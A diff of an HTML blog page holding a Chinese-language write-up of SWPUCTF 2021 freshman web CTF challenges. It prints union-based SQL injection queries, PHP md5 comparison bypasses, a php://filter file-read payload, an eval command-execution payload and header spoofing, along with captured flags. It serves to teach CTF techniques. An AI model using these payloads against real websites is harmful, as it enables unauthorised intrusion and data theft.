@@ -19,12 +19,12 @@
   <meta name="author" content="zer0ptr">
   <meta name="keywords" content="">
   
-    <meta name="description" content="[SWPUCTF 2021 新生赛]gift_F12Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可 [SWPUCTF 2021 新生赛]jicao&lt;?php highlight_file(&#x27;index.php&#x27;); include(&quot;flag.php&quot;); $id&#x3D;$_POST[&#x27;id&#x27;]; $json&#x3D;json_decod">
+    <meta name="description" content="[SWPUCTF 2021 新生赛]gift_F12 Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可 [SWPUCTF 2021 新生赛]jicao &lt;?php highlight_file(&#x27;index.php&#x27;); include(&quot;flag.php&quot;); $id&#x3D;$_POST[&#x27;id&#x27;]; $json&#x3D;json_dec">
 <meta property="og:type" content="article">
 <meta property="og:title" content="SWPUCTF2021新生赛Web刷题记录">
 <meta property="og:url" content="https://zer0ptr.github.io/2025/07/21/SWPUCTF2021%E6%96%B0%E7%94%9F%E8%B5%9BWeb%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/index.html">
 <meta property="og:site_name" content="zer0ptr&#39;s Blog">
-<meta property="og:description" content="[SWPUCTF 2021 新生赛]gift_F12Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可 [SWPUCTF 2021 新生赛]jicao&lt;?php highlight_file(&#x27;index.php&#x27;); include(&quot;flag.php&quot;); $id&#x3D;$_POST[&#x27;id&#x27;]; $json&#x3D;json_decod">
+<meta property="og:description" content="[SWPUCTF 2021 新生赛]gift_F12 Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可 [SWPUCTF 2021 新生赛]jicao &lt;?php highlight_file(&#x27;index.php&#x27;); include(&quot;flag.php&quot;); $id&#x3D;$_POST[&#x27;id&#x27;]; $json&#x3D;json_dec">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-2.png">
 <meta property="og:image" content="https://zer0ptr.github.io/images/SWPUCTF-Web-3.png">
@@ -311,8 +311,10 @@
             
               <div class="markdown-body">
                 
-                <h2 id="SWPUCTF-2021-新生赛-gift-F12"><a href="#SWPUCTF-2021-新生赛-gift-F12" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_F12"></a>[SWPUCTF 2021 新生赛]gift_F12</h2><p>Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可</p>
-<h2 id="SWPUCTF-2021-新生赛-jicao"><a href="#SWPUCTF-2021-新生赛-jicao" class="headerlink" title="[SWPUCTF 2021 新生赛]jicao"></a>[SWPUCTF 2021 新生赛]jicao</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
+                <h2 id="swpuctf-2021-新生赛-gift-f12">[SWPUCTF 2021 新生赛]gift_F12</h2>
+<p>Ctrl+U查看前端源码再Ctrl+F搜搜Flag即可</p>
+<h2 id="swpuctf-2021-新生赛-jicao">[SWPUCTF 2021 新生赛]jicao</h2>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">&#x27;index.php&#x27;</span>);
 <span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);
 <span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>];
@@ -320,9 +322,9 @@
 <span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>==<span class="hljs-string">&quot;wllmNB&quot;</span>&amp;&amp;<span class="hljs-variable">$json</span>[<span class="hljs-string">&#x27;x&#x27;</span>]==<span class="hljs-string">&quot;wllm&quot;</span>)
 &#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;&#125;
 <span class="hljs-meta">?&gt;</span></code></pre></div>
-
 <p>代码审计，以post方式传<code>id=wllmNB</code>和以get方式传<code>json=&#123;&quot;x&quot;:&quot;wllm&quot;&#125;</code>即可</p>
-<h2 id="SWPUCTF-2021-新生赛-easy-md5"><a href="#SWPUCTF-2021-新生赛-easy-md5" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_md5"></a>[SWPUCTF 2021 新生赛]easy_md5</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
+<h2 id="swpuctf-2021-新生赛-easy-md5">[SWPUCTF 2021 新生赛]easy_md5</h2>
+<div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
  <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
  <span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;flag2.php&#x27;</span>;
  
@@ -342,13 +344,14 @@
 &#125;
 <span class="hljs-meta">?&gt;</span>
 wrong!</code></pre></div>
-
 <p>要求：<code>name</code>的值不等于<code>password</code>的值且其md5后相等</p>
 <p>两种方法：</p>
-<h4 id="1-数组漏洞绕过"><a href="#1-数组漏洞绕过" class="headerlink" title="1.数组漏洞绕过"></a>1.数组漏洞绕过</h4><p><img src="/images/SWPUCTF-Web-2.png" srcset="/img/loading.gif" lazyload alt="图一展示了利用数组漏洞以进行绕过"></p>
+<h4 id="1-数组漏洞绕过">1.数组漏洞绕过</h4>
+<p><img src="/images/SWPUCTF-Web-2.png" srcset="/img/loading.gif" lazyload alt="图一展示了利用数组漏洞以进行绕过"></p>
 <p>原理：PHP md5函数接收的参数为string（字符串型），如果传入arry（数组型）就无法计算其md5值，但不会报错，导致数组md5值都相等</p>
-<h4 id="2-PHP弱比较"><a href="#2-PHP弱比较" class="headerlink" title="2.PHP弱比较"></a>2.PHP弱比较</h4><p><img src="/images/SWPUCTF-Web-3.png" srcset="/img/loading.gif" lazyload alt="图二展示了利用PHP弱比较以进行绕过"></p>
-<p>原理：PHP在进行“&#x3D;&#x3D;”（弱类型比较）时，会先转换字符串类型，再进行字符串比较，而进行md5后以0e开头的都会被PHP识别为科学计数法，即<code>0e*</code>被视作0的<code>*</code>次方，结果都为0，故我们只需找到md5后为<code>0e*</code>的字符串，常用md5后为<code>0e*</code>的有：</p>
+<h4 id="2-php弱比较">2.PHP弱比较</h4>
+<p><img src="/images/SWPUCTF-Web-3.png" srcset="/img/loading.gif" lazyload alt="图二展示了利用PHP弱比较以进行绕过"></p>
+<p>原理：PHP在进行“==”（弱类型比较）时，会先转换字符串类型，再进行字符串比较，而进行md5后以0e开头的都会被PHP识别为科学计数法，即<code>0e*</code>被视作0的<code>*</code>次方，结果都为0，故我们只需找到md5后为<code>0e*</code>的字符串，常用md5后为<code>0e*</code>的有：</p>
 <div class="code-wrapper"><pre><code class="hljs dns">字符串         对应md5值
 
 <span class="hljs-number">240610708</span>      <span class="hljs-number">0</span>e4620974319065090195<span class="hljs-number">62988736854</span>
@@ -366,38 +369,36 @@ NOOPCJF       <span class="hljs-number">0</span>e818888003657176127<span class="
 MMHUWUV    <span class="hljs-number">0</span>e701732711630150438<span class="hljs-number">129209816536</span>
 
 MAUXXQC     <span class="hljs-number">0</span>e4784784668484390404<span class="hljs-number">34801845361</span></code></pre></div>
-
 <p>注：以上字符串要记得两个及两个以上，对应md5值不用记</p>
-<h2 id="SWPUCTF-2021-新生赛-easy-sql"><a href="#SWPUCTF-2021-新生赛-easy-sql" class="headerlink" title="[SWPUCTF 2021 新生赛]easy_sql"></a>[SWPUCTF 2021 新生赛]easy_sql</h2><p><img src="/images/SWPUCTF-Web-4.png" srcset="/img/loading.gif" lazyload alt="图三展示了题目中给的提示和一个很大只的杰哥"></p>
+<h2 id="swpuctf-2021-新生赛-easy-sql">[SWPUCTF 2021 新生赛]easy_sql</h2>
+<p><img src="/images/SWPUCTF-Web-4.png" srcset="/img/loading.gif" lazyload alt="图三展示了题目中给的提示和一个很大只的杰哥"></p>
 <div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; order by 1 --+</span></code></pre></div>
-
-
-
 <p><img src="/images/SWPUCTF-Web-sql-2.png" srcset="/img/loading.gif" lazyload alt="图四展示了开始猜字段"></p>
-<h4 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; order by 1 --+</span></code></pre></div>
-
-<h4 id="判断出字段数为3"><a href="#判断出字段数为3" class="headerlink" title="判断出字段数为3"></a>判断出字段数为3</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; order by 3 --+</span></code></pre></div>
-
-<h4 id="查看回显点"><a href="#查看回显点" class="headerlink" title="查看回显点"></a>查看回显点</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span></code></pre></div>
-
-<h4 id="查看数据库信息"><a href="#查看数据库信息" class="headerlink" title="查看数据库信息"></a>查看数据库信息</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, @@version --+</span></code></pre></div>
-
+<h4 id="确定回显点">确定回显点</h4>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; order by 1 --+</span></code></pre></div>
+<h4 id="判断出字段数为3">判断出字段数为3</h4>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; order by 3 --+</span></code></pre></div>
+<h4 id="查看回显点">查看回显点</h4>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,3 --+</span></code></pre></div>
+<h4 id="查看数据库信息">查看数据库信息</h4>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, @@version --+</span></code></pre></div>
 <p><img src="/images/SWPUCTF-Web-sql-3.png" srcset="/img/loading.gif" lazyload alt="图五展示了通过sql注入查看数据库信息"></p>
 <p>MariaDB数据库管理系统是MySQL的一个分支，说明需要使用mysql语句注入</p>
-<h4 id="查询库名和用户名"><a href="#查询库名和用户名" class="headerlink" title="查询库名和用户名"></a>查询库名和用户名</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, database() --+</span></code></pre></div>
-
-<h4 id="可知，当前数据库名为test-db"><a href="#可知，当前数据库名为test-db" class="headerlink" title="可知，当前数据库名为test_db"></a>可知，当前数据库名为test_db</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, user() --+</span></code></pre></div>
-
-<h4 id="得知目前用户是root-可以查看任意数据库信息"><a href="#得知目前用户是root-可以查看任意数据库信息" class="headerlink" title="得知目前用户是root 可以查看任意数据库信息"></a>得知目前用户是<code>root</code> 可以查看任意数据库信息</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27;--+</span></code></pre></div>
-
-<h4 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h4><p>发现有两个表，test_tb和users</p>
+<h4 id="查询库名和用户名">查询库名和用户名</h4>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, database() --+</span></code></pre></div>
+<h4 id="可知-当前数据库名为test-db">可知，当前数据库名为test_db</h4>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, user() --+</span></code></pre></div>
+<h4 id="得知目前用户是root-可以查看任意数据库信息">得知目前用户是<code>root</code> 可以查看任意数据库信息</h4>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>test_db<span class="hljs-string">&#x27;--+</span></code></pre></div>
+<h4 id="爆表">爆表</h4>
+<p>发现有两个表，test_tb和users</p>
 <div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1, 2, group_concat(column_name) from information_schema.columns where table_name=&#x27;</span>test_tb<span class="hljs-string">&#x27; --+</span></code></pre></div>
-
 <p>发现有<code>flag</code>表</p>
-<h4 id="查看flag表内容"><a href="#查看flag表内容" class="headerlink" title="查看flag表内容"></a>查看<code>flag</code>表内容</h4><div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2, group_concat(flag) from test_tb --+</span></code></pre></div>
-
+<h4 id="查看flag表内容">查看<code>flag</code>表内容</h4>
+<div class="code-wrapper"><pre><code class="hljs sql"><span class="hljs-operator">/</span>?wllm<span class="hljs-operator">=</span><span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2, group_concat(flag) from test_tb --+</span></code></pre></div>
 <p><img src="/images/SWPUCTF-Web-sql-4.png" srcset="/img/loading.gif" lazyload alt="成功拿到flag"></p>
-<h2 id="SWPUCTF-2021-新生赛-include"><a href="#SWPUCTF-2021-新生赛-include" class="headerlink" title="[SWPUCTF 2021 新生赛]include"></a>[SWPUCTF 2021 新生赛]include</h2><p><img src="/images/SWPUCTF-Web-include-1.png" srcset="/img/loading.gif" lazyload alt="题目详情"></p>
+<h2 id="swpuctf-2021-新生赛-include">[SWPUCTF 2021 新生赛]include</h2>
+<p><img src="/images/SWPUCTF-Web-include-1.png" srcset="/img/loading.gif" lazyload alt="题目详情"></p>
 <p>用<code>Hackbar</code>传入一个<code>file</code>试试</p>
 <p><img src="/images/SWPUCTF-Web-include-2.png" srcset="/img/loading.gif" lazyload alt="图二展示了利用Hackbar传入一个名为file值为1的参数后页面回显"></p>
 <div class="code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
@@ -418,20 +419,19 @@ MAUXXQC     <span class="hljs-number">0</span>e4784784668484390404<span class="h
 <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;
 <span class="hljs-keyword">include_once</span>(<span class="hljs-variable">$file</span>);
 <span class="hljs-meta">?&gt;</span> flag 在flag.php中</code></pre></div>
-
 <p>分析脚本发现其中开了远程包含，说明我们可以用文件包含(远程包含)去做这道题，我们通过PHP伪协议来远程包含并读取<code>flag.php</code>文件</p>
-<h3 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h3><h4 id="php-filter"><a href="#php-filter" class="headerlink" title="php:&#x2F;&#x2F;filter"></a>php:&#x2F;&#x2F;filter</h4><p>php:&#x2F;&#x2F;filter可以获取指定文件源码。当它与包含函数结合时，php:&#x2F;&#x2F;filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取</p>
+<h3 id="php伪协议">PHP伪协议</h3>
+<h4 id="php-filter">php://filter</h4>
+<p>php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取</p>
 <p>For example:</p>
 <div class="code-wrapper"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=index.php</span></code></pre></div>
-
 <p>通俗来讲，convert.base64-encode是一种过滤器，read是用来指定读取的文章内容利用管道符，来进行条件的再筛选，后面要进行base64-encode以解码</p>
 <p>构造以下payload</p>
 <div class="code-wrapper"><pre><code class="hljs php">/?file=php:<span class="hljs-comment">//filter/read=convert.base64-encode/resource=flag.php</span></code></pre></div>
-
 <p><img src="/images/SWPUCTF-Web-include-3.png" srcset="/img/loading.gif" lazyload alt="图三展示了利用php伪协议以读取flag.php文件"></p>
 <div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$flag</span>=<span class="hljs-string">&#x27;NSSCTF&#123;e8c19d3d-d948-4e0b-8d6d-1fbf35fd3ba2&#125;&#x27;</span>;</code></pre></div>
-
-<h2 id="SWPUCTF-2021-新生赛-easyrce"><a href="#SWPUCTF-2021-新生赛-easyrce" class="headerlink" title="[SWPUCTF 2021 新生赛]easyrce"></a>[SWPUCTF 2021 新生赛]easyrce</h2><div class="code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
+<h2 id="swpuctf-2021-新生赛-easyrce">[SWPUCTF 2021 新生赛]easyrce</h2>
+<div class="code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
 <span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
 <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
 <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))
@@ -439,21 +439,18 @@ MAUXXQC     <span class="hljs-number">0</span>e4784784668484390404<span class="h
 <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>]);
 &#125;
 <span class="hljs-meta">?&gt;</span></code></pre></div>
-
-<p><img src="/images/SWPUCTF-Web-easyrce-1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/SWPUCTF-Web-easyrce-1.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <p>替换成：</p>
 <div class="code-wrapper"><pre><code class="hljs clean">/?url=<span class="hljs-keyword">system</span>(<span class="hljs-string">&quot;cat /flllllaaaaaaggggggg&quot;</span>);</code></pre></div>
-
-<p><img src="/images/SWPUCTF-Web-easyrce-2.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="SWPUCTF-2021-新生赛-caidao"><a href="#SWPUCTF-2021-新生赛-caidao" class="headerlink" title="[SWPUCTF 2021 新生赛]caidao"></a>[SWPUCTF 2021 新生赛]caidao</h2><p>直接AntSword连接后在根目录下找到flag</p>
+<p><img src="/images/SWPUCTF-Web-easyrce-2.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<h2 id="swpuctf-2021-新生赛-caidao">[SWPUCTF 2021 新生赛]caidao</h2>
+<p>直接AntSword连接后在根目录下找到flag</p>
 <div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">NSSCTF</span>&#123;<span class="hljs-number">68</span>bb6079-<span class="hljs-number">56</span>dc-<span class="hljs-number">4</span>f7a-ba1e-<span class="hljs-number">96</span>afcdca7b1a&#125;</code></pre></div>
-
-
-
-<h2 id="SWPUCTF-2021-新生赛-Do-you-know-http"><a href="#SWPUCTF-2021-新生赛-Do-you-know-http" class="headerlink" title="[SWPUCTF 2021 新生赛]Do_you_know_http"></a>[SWPUCTF 2021 新生赛]Do_you_know_http</h2><p>抓包后将<code>User-Agent</code>改成<code>WLLM</code></p>
-<p><img src="/images/SWPUCTF-http-1.png" srcset="/img/loading.gif" lazyload></p>
-<p><img src="/images/SWPUCTF-http-2.png" srcset="/img/loading.gif" lazyload></p>
-<p>发现这里是有一个文件的，还给了提示”智能用本地ip访问”</p>
+<h2 id="swpuctf-2021-新生赛-do-you-know-http">[SWPUCTF 2021 新生赛]Do_you_know_http</h2>
+<p>抓包后将<code>User-Agent</code>改成<code>WLLM</code></p>
+<p><img src="/images/SWPUCTF-http-1.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p><img src="/images/SWPUCTF-http-2.png" srcset="/img/loading.gif" lazyload alt=""></p>
+<p>发现这里是有一个文件的，还给了提示&quot;智能用本地ip访问&quot;</p>
 <p>直接用XFF(X-Forwarded-For)</p>
 <div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /./a.php HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>
 <span class="hljs-attribute">Host</span>: node7.anna.nssctf.cn:<span class="hljs-number">28524</span>
@@ -466,13 +463,11 @@ MAUXXQC     <span class="hljs-number">0</span>e4784784668484390404<span class="h
 <span class="hljs-attribute">Connection</span>: keep-alive
 <span class="hljs-attribute">X</span>-Forwarded-For:<span class="hljs-number">127.0.0.1</span>
 <span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">2</span></code></pre></div>
-
-<p><img src="/images/SWPUCTF-Web-http-3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/SWPUCTF-Web-http-3.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <p>在MITM交互式劫持页面选择放行（我们上面构造的数据包）</p>
-<p><img src="/images/SWPUCTF-Web-http-3.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/SWPUCTF-Web-http-3.png" srcset="/img/loading.gif" lazyload alt=""></p>
 <p>成功拿到flag</p>
 <div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">NSSCTF</span>&#123;ee2756e8-a41c-<span class="hljs-number">4</span>d15-<span class="hljs-number">8</span>bd9-<span class="hljs-number">0</span>f50a445919d&#125;</code></pre></div>
-
 
                 
               </div>
